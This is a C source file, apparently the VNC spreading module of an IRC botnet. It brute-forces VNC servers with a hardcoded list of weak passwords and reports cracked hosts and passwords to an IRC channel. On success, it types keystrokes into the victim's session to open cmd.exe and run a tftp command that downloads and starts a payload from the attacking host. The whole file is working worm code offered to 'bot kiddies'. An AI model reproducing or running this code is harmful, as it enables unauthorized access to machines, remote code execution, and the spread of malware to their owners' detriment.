// VNC SHIT SCANNER !!! enjoy bot kiddies
// Credits and Copyright to
// -------->
//  Copyright (C) 2000, 2001 Constantin Kaplinsky. All Rights Reserved.
//  Copyright (C) 1999 AT&T Laboratories Cambridge. All Rights Reserved.
//  This file is part of the VNC system.
// TightVNC distribution homepage on the Web: http://www.tightvnc.com/
// If the source code for the VNC system is not available from the place 
// whence you received this file, check http://www.uk.research.att.com/vnc or contact
// the authors on vnc@uk.research.att.com for information on obtaining it.


#include "Inc.h"
#include "Fun.h"
#include "Ext.h"

#define CHALLENGESIZE 16


int ReadExact(SOCKET r_sock, char *inbuf, int wanted) { 

   int offset = 0; 
    
   while (wanted > 0) { 
      int bytes = recv(r_sock, inbuf+offset, wanted, 0); 
      if ((bytes == 0) || (bytes == SOCKET_ERROR)) return 0; 
      wanted -= bytes; 
      offset += bytes; 
   } 

   return 1; 
} 

int WriteExact(SOCKET w_sock, char *buf, int bytes) { 

   if (bytes == 0) 
	   return FALSE; 

   int i = 0; 
   int j; 

    while (i < bytes) { 
      j = send(w_sock, buf+i, bytes-i, 0); 
      if (j == SOCKET_ERROR || j==0) return 0; 
      i += j; 
    } 

   return 1; 
}

void vncEncryptBytes(unsigned char *bytes, char *passwd) {
    unsigned char key[8];
    unsigned int i;

    /* key is simply password padded with nulls */

    for (i = 0; i < 8; i++) {
	if (i < strlen(passwd)) {
	    key[i] = passwd[i];
	} else {
	    key[i] = 0;
	}
    }

    deskey(key, EN0);

    for (i = 0; i < 16; i += 8) {
		des(bytes+i, bytes+i);
    }
}

/////////////////////////////////////////////////////////////
void send_key(SOCKET SOCK, char *szKey, DWORD dwKeyState = 0) 
{ 
   char szVNCSendKey[] = "\x04", 
       szKeyDown[] = "\x01", 
       szKeyUp[] = "\x00", 
       szNullBytes_1[] = "\x00\x00\x00\x00", 
       szNullBytes_2[] = "\x00\x00\x00\x00\x00"; 

   //Can't use _snprintf to just send one bit of data because of null bytes 
   if (dwKeyState == 0) 
   { 
      for (int i = 0; i <= 1; i++) 
      { 
         switch (i) 
         { 
         case 0: 
            fsend(SOCK, szVNCSendKey, 1, 0); 
            fsend(SOCK, szKeyDown, 1, 0); 

            if (strlen(szKey) == 2) 
               fsend(SOCK, szNullBytes_1, 4, 0); 
            else 
               fsend(SOCK, szNullBytes_2, 5, 0); 

            fsend(SOCK, szKey, strlen(szKey), 0); 

            break; 
         case 1: 
            fsend(SOCK, szVNCSendKey, 1, 0); 
            fsend(SOCK, szKeyUp, 1, 0); 

            if (strlen(szKey) == 2) 
               fsend(SOCK, szNullBytes_1, 4, 0); 
            else 
               fsend(SOCK, szNullBytes_2, 5, 0); 
    
            fsend(SOCK, szKey, strlen(szKey), 0); 

            break; 
         } 
      } 
   } 
   else { 
      switch (dwKeyState) 
      { 
      case 1: 
         fsend(SOCK, szVNCSendKey, 1, 0); 
         fsend(SOCK, szKeyDown, 1, 0); 

         if (strlen(szKey) == 2) 
            fsend(SOCK, szNullBytes_1, 4, 0); 
         else 
            fsend(SOCK, szNullBytes_2, 5, 0); 

         fsend(SOCK, szKey, strlen(szKey), 0); 

         break; 
      case 2: 
         fsend(SOCK, szVNCSendKey, 1, 0); 
         fsend(SOCK, szKeyUp, 1, 0); 

         if (strlen(szKey) == 2) 
            fsend(SOCK, szNullBytes_1, 4, 0); 
         else 
            fsend(SOCK, szNullBytes_2, 5, 0); 
    
         fsend(SOCK, szKey, strlen(szKey), 0); 

         break; 
      } 
   } 
} 

void vncSpawn(SOCKET sVNC)
{
	char text_cmd[] = "%systemroot%\\system32\\cmd.exe"; 
char text_exit[] = "exit"; 
char text_tftp[256] = {0}; 
      char szChar[4], szClientPacket_2[] = "\x01", 
       szKeyWindows[] = "\xFF\xEB", 
       szKeyArrowLeft[] = "\xFF\x51", 
       szKeyEnter[] = "\xFF\x0D", 
       szKeyR[] = "\x72"; 


	fsend(sVNC, szClientPacket_2, 1, 0); //either with this line or without, dunno, umm i have this one too

   //press WINKEY 
   send_key(sVNC, szKeyWindows, 1); 
   Sleep(1000); 

   //press and release R key 
   send_key(sVNC, szKeyR); 
   Sleep(1000); 

   //release WINKEY 
   send_key(sVNC, szKeyWindows, 2); 
   Sleep(1000); 

   //type in "cmd" 
   for (unsigned int i = 0; i < strlen(text_cmd); i++) 
   { 
      _snprintf(szChar, sizeof(szChar) - 1, "%c", text_cmd[i]); 
      send_key(sVNC, szChar); 
      Sleep(125); 
   } 

   //press ENTER 
   send_key(sVNC, szKeyEnter); 
   Sleep(2000); 

   //set text_tftp line with tftp and all parameters needed 
   memset(text_tftp, 0, sizeof(text_tftp)); 
   _snprintf(text_tftp, sizeof(text_tftp) - 1, "tftp -i %s get %s& start %s& exit", GetIP(sVNC), filename, filename); 

   //send text_tftp line 
   for (i = 0; i < strlen(text_tftp); i++) 
   { 
      _snprintf(szChar, sizeof(szChar) - 1, "%c", text_tftp[i]); 
      send_key(sVNC, szChar); 
      Sleep(125); 
   } 

   //press ENTER 
   Sleep(1000);
   send_key(sVNC, szKeyEnter); 
/*
   //wait for file to download 
   Sleep(30000); 

   //type in file name 
   for (i = 0; i < strlen(filename); i++) 
   { 
      _snprintf(szChar, sizeof(szChar) - 1, "%c", filename[i]); 
      send_key(sVNC, szChar); 
      Sleep(125); 
   } 

   //press ENTER 
   Sleep(1000); 
  send_key(sVNC, szKeyEnter); 

   //type in "exit" 
   for (i = 0; i < strlen(text_exit); i++) 
   { 
      _snprintf(szChar, sizeof(szChar) - 1, "%c", text_exit[i]); 
      send_key(sVNC, szChar); 
      Sleep(125); 
   } 
*/
   //press ENTER 
   for (i = 0; i <= 1; i++) 
   { 
      Sleep(600); 
      send_key(sVNC, szKeyEnter); 
   } 


   Sleep(1000);
   fclosesocket(sVNC);
   return;
}

int vncshit(EXINFO exinfo, char *passwd)
{
	char sendbuf[IRCLINE];

	struct sockaddr_in ssin;

	SOCKET sock = fsocket(AF_INET,SOCK_STREAM,0);
	if (sock == INVALID_SOCKET) 
		return FALSE;

	int m_majorVersion, m_minorVersion;

	ssin.sin_addr.s_addr= finet_addr(exinfo.ip);
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)exinfo.port);

	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(fconnect(sock, (LPSOCKADDR)&ssin, sizeof(ssin))) {
		sprintf(sendbuf,"VNC[-] Could not connect to %s", exinfo.ip);
	    addlog(sendbuf);
		return false;
	}

	rfbProtocolVersionMsg pv;



	ReadExact(sock, pv, sz_rfbProtocolVersionMsg);

    pv[sz_rfbProtocolVersionMsg] = 0;


	m_majorVersion = rfbProtocolMajorVersion;
	m_minorVersion = rfbProtocolMinorVersion;



	if (!(m_majorVersion == 3) && !(m_minorVersion == 8)) {

		sprintf(sendbuf,"VNC[%d.%d] %s Auth ByPass Vuln!!!", m_majorVersion, m_minorVersion, exinfo.ip);
	    irc_privmsg( exinfo.sock, exinfo.chan, sendbuf, exinfo.notice );
		addlog(sendbuf);
		return false;
	}


    sprintf(pv,rfbProtocolVersionFormat,m_majorVersion,m_minorVersion);


    WriteExact(sock, pv, sz_rfbProtocolVersionMsg);

	CARD32 authScheme, authResult;
    CARD8 challenge[CHALLENGESIZE];
	
	ReadExact(sock,(char *)&authScheme, 4);
    authScheme = Swap32IfLE(authScheme);
	
    switch (authScheme) {
		
    case rfbConnFailed:
		sprintf(sendbuf,"VNC[-] %s connection failed", exinfo.ip);
	    //irc_privmsg( exinfo.sock, exinfo.chan, sendbuf, exinfo.notice );
		//addlog(sendbuf);
        return false;
		
    case rfbNoAuth:
		sprintf(sendbuf,"VNC[%d.%d] %s NoPass !!!", m_majorVersion, m_minorVersion, exinfo.ip);
	    irc_privmsg( exinfo.sock, exinfo.chan, sendbuf, exinfo.notice );
		ExitThread(1);
		addlog(sendbuf);
		return false;

    case rfbVncAuth:
		{
			ReadExact(sock ,(char *)challenge, CHALLENGESIZE);

			if (strlen(passwd) > 8) {

				passwd[8] = '\0';
			}			
	
			vncEncryptBytes(challenge, passwd);
			
			WriteExact(sock, (char *) challenge, CHALLENGESIZE);
			ReadExact(sock, (char *) &authResult, 4);
			
			authResult = Swap32IfLE(authResult);
			
			switch (authResult) {
			case rfbVncAuthOK:
				sprintf(sendbuf,"CRACKED VNC[%d.%d] %s Pass-> %s !!!", m_majorVersion, m_minorVersion, exinfo.ip, passwd);
	            irc_privmsg( exinfo.sock, exinfo.chan, sendbuf, exinfo.notice );
				vncSpawn(sock);
				addlog(sendbuf);
				return false;
			case rfbVncAuthFailed:
				sprintf(sendbuf,"VNC[%d.%d] %s failed pass: %s!", m_majorVersion, m_minorVersion, exinfo.ip , passwd);
	            //irc_privmsg( exinfo.sock, exinfo.chan, sendbuf, exinfo.notice );
				//addlog(sendbuf); 
				return false;
			case rfbVncAuthTooMany:
				sprintf(sendbuf,"VNC[-] %s failed pass - too many tries!", exinfo.ip);
	            //irc_privmsg( exinfo.sock, exinfo.chan, sendbuf, exinfo.notice );
				Sleep(10000);
				//addlog(sendbuf);
				return false;
			default:
				Sleep(3000);
				sprintf(sendbuf,"VNC[-] %s authentication result:%d", exinfo.ip, (int)authResult);
	            irc_privmsg( exinfo.sock, exinfo.chan, sendbuf, exinfo.notice );
				addlog(sendbuf);
				return false;
			}
			break;
		}
		
	default:
		sprintf(sendbuf,"VNC[-] %s Unknown authentication scheme from VNC server:%d", exinfo.ip);
	   // irc_privmsg( exinfo.sock, exinfo.chan, sendbuf, exinfo.notice );
		//addlog(sendbuf);
		return false;
    }
	closesocket(sock);
}

BOOL vncscan(EXINFO exinfo)
{
	char *passes[] = { 
		"123",
		"abc123",
		"12345",
		"test",
		"pass",
		"vnc",
		"server",
		"a123",
		"admin",
		NULL };

	for (int i=0; passes[i]; i++) {
		if(!vncshit(exinfo, passes[i]));// this line should prolly be without ;
		Sleep(1000);
	
/* warning cant be fixed unless u remove this whole code*/
   exploit[ exinfo.exploit ].stats++;
	}

	return FALSE;
} 


